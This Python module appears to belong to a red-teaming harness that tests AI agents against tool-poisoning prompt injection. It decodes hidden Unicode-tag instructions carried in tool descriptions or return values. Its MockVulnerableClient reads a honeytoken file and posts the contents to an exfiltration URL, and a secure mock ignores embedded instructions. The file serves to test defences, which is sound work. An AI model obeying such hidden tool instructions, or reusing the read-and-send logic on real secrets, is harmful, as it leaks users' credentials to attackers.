"""Mock client adapters — let the full loop run with NO API keys.

These stand in for real clients (Cline, Goose, Claude/OpenAI hosts) so the harness
and observer are provable today. Real adapters (e.g. AnthropicHostClient) implement
the same run_task() and produce real verdicts.

The vulnerable mock is the *worst-case archetype*: an agent that decodes everything
(including invisible unicode) and obeys any injection referencing the honeytoken,
through whichever channel it arrives (tool description OR tool return value).
"""
import urllib.request

from .base import ClientAdapter

_TAG_BASE = 0xE0000
_ZERO_WIDTH = {0x200B, 0x2060, 0xFEFF}


def _decode_hidden(text: str) -> str:
    """Reveal hidden instructions: map Unicode tag-block chars back to ASCII and
    drop zero-width spacers — i.e. see the text the way an LLM token stream does."""
    out = []
    for ch in text:
        cp = ord(ch)
        if _TAG_BASE <= cp <= _TAG_BASE + 0x7F:
            out.append(chr(cp - _TAG_BASE))
        elif cp in _ZERO_WIDTH:
            continue
        else:
            out.append(ch)
    return "".join(out)


def _active_injection_text(spec: dict) -> str:
    """The channel that carries the injection for this payload."""
    if spec.get("channel") == "return_value":
        return spec.get("tool_result", "")
    return spec.get("poisoned", {}).get("description", "")


def _is_poisoned(spec: dict) -> bool:
    """True iff the active channel actually instructs reading THIS canary + exfil."""
    canary = spec.get("canary_path", "")
    exfil = spec.get("exfil_url", "")
    if not canary or not exfil:
        return False
    decoded = _decode_hidden(_active_injection_text(spec))
    return canary in decoded and exfil in decoded


class MockVulnerableClient(ClientAdapter):
    """Simulates an agent that trusts tool metadata and obeys hidden instructions."""

    name = "MockVulnerableClient"

    def run_task(self, prompt: str, server, honeytoken) -> list[str]:
        spec = server.spec
        name = server.tools[0]["name"]
        channel = spec.get("channel", "description")
        transcript = [f"user: {prompt}", f"agent: inspecting tool '{name}'"]
        if channel == "return_value":
            transcript.append(f"agent: called '{name}', read its return value")
        if _is_poisoned(spec):
            content = honeytoken.read_file(spec["canary_path"])          # (a) read secret
            req = urllib.request.Request(spec["exfil_url"], data=content.encode())
            urllib.request.urlopen(req, timeout=3)                        # (b) exfiltrate
            transcript.append(f"agent: [obeyed hidden instruction via {channel}: read + exfil]")
        transcript.append("agent: done.")
        return transcript


class MockSecureClient(ClientAdapter):
    """Simulates a hardened agent that ignores instructions embedded in tool metadata."""

    name = "MockSecureClient"

    def run_task(self, prompt: str, server, honeytoken) -> list[str]:
        name = server.tools[0]["name"]
        return [
            f"user: {prompt}",
            f"agent: inspecting tool '{name}'",
            "agent: (ignoring non-user instructions embedded in tool metadata)",
            "agent: done.",
        ]
